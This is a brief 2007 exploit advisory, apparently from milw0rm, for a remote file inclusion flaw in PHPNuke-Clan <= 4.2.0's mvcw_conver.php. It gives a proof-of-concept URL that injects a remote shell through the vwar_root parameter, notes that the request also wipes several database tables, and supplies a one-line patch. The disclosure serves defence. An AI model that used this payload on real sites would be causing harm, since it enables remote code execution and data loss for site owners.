@@ -1,0 +1,40 @@
+                                  \#'#/
+                                  (-.-)
+   --------------------------oOO---(_)---OOo-------------------------
+   | PHPNuke-Clan <= v4.2.0 (mvcw_conver.php) Remote File Inclusion |
+   |                          coded by DNX                          |
+   ------------------------------------------------------------------
+[!] Discovered: DNX
+[!] Vendor: http://www.phpnuke-clan.net
+[!] Detected: 11.08.2007
+[!] Reported: 11.08.2007
+[!] Remote: yes
+
+[!] Background: PHPNuke-Clan is a clan management system based on PHP and MySQL
+
+[!] Bug: $vwar_root in modules/vwar/convert/mvcw_conver.php
+
+[!] PoC:
+    - http://[site]/[path]/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=[shell]
+
+[!] Example:
+    - http://127.0.0.1/pnc/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http//127.0.0.1/shell.txt?
+
+[!] Warning: "step=1" deletes all data from the tables vwar, vwar_opponents,
+    vwar_scores and vwar_screen in the database
+
+[!] Solution: No update from vendor till now
+
+[!] Quick fix in modules/vwar/convert/mvcw_conver.php line 79:
+    - replace:
+	if ($GPC['step'] == 1)
+	{
+		// clean tables
+
+    - with:
+	if ($GPC['step'] == 1)
+	{
+		$vwar_root = "./../";
+		// clean tables
+
+# milw0rm.com [2007-08-28]
